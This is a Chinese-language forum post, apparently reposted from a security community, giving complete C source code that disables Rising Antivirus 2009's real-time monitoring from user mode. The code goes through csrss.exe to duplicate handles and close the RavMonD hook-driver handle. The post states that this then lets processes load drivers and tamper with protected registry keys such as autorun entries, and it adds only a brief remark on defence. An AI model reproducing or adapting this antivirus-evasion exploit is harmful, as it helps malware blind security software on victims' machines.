
# 用户层关闭瑞星 2009 杀毒软件安全保护

> 原文：[`www.pediy.com/kssd/pediy10/94598.html`](https://www.pediy.com/kssd/pediy10/94598.html)

只是一个小小的思路，老鸟自行飘过，呵呵

我写这个纯粹是 `hacker` 精神，如果被滥用做病毒木马一类的邋遢东东，可跟偶没关系哦。

原理 `very` 简单，我发现瑞星监控主要在 `RavMonD` 进程中，如果打破其与内核的联系，则瑞星监控功能就无法正常工作了，怎么打破联系呢？如果是进内核的话当然有很多的办法，从而没有挑战性了，况且 `RavMonD` 会阻止用户进程去加载驱动或者动注册表的关键地方，比如 `run` 子键。下面上测试代码：

代码：

```c
int main(int argc,char *argv[])
 {
     if(argc != 4)
         puts("usage ccon csrss.pid prmd.handle hooksys.handle");
     else
     {
         int pid = atoi(argv[1]);
         int hprmd = atoi(argv[2]);
         int hobj = atoi(argv[3]);

         if(!SetDebugPrivilege(true))
             puts("SetDebugPrivilege Failed!");
         HANDLE hcs = OpenProcess(PROCESS_ALL_ACCESS,false,pid);
         if(!hcs)
         {
             puts("Open Csrss.exe Failed");
             PrintErr(GetLastError());
         }
         else //直接打开 RavMonD 进程会失败的，so 采用迂回战术
         {
             HANDLE hprmd_loc;
             if(!DuplicateHandle(hcs,(HANDLE)hprmd,GetCurrentProcess(),\\
                 &hprmd_loc,PROCESS_ALL_ACCESS,false,0))
             {
                 puts("Get hprmd_loc Failed!");
                 PrintErr(GetLastError());
             }
             else //关闭 hooksys 的句柄，打破其与内核的联系
             {
                 HANDLE hobj_loc;
                 if(!DuplicateHandle(hprmd_loc,(HANDLE)hobj,\\
                     GetCurrentProcess(),&hobj_loc,0,false,\\
                     DUPLICATE_CLOSE_SOURCE | DUPLICATE_SAME_ACCESS))
                 {
                     puts("Get hobj_loc Failed!");
                     PrintErr(GetLastError());
                 }
                 else
                 {
                     if(!CloseHandle(hobj_loc))
                     {
                         puts("Close hobj_loc Failed");
                     }
                     else
                         puts("We Success Finally!!!");
                 }
             }
         }
     }
     return 0;
 }        
```

打破瑞星监控与内核的关联之后，用户进程可以任意加载驱动程序进内核或者篡改注册表中的关键内容，我测试了一下，虽然第一次修改注册表中的监控内容时瑞星还是会提示用户是否允许修改，但是这时即使选择否，同样可以修改成功，而且以后的修改瑞星不会再提示了。

其实防守起来也很容易，瑞星只要不让我们在 `ring3` 下取到 `hooksys` 的句柄就行了，当然仍然防不住内核中的攻击，进入 `ring0` 还是可以为所欲为。

我的测试环境 `windows xp sp3` + 瑞星杀毒 `2009 21.49.14` 测试成功
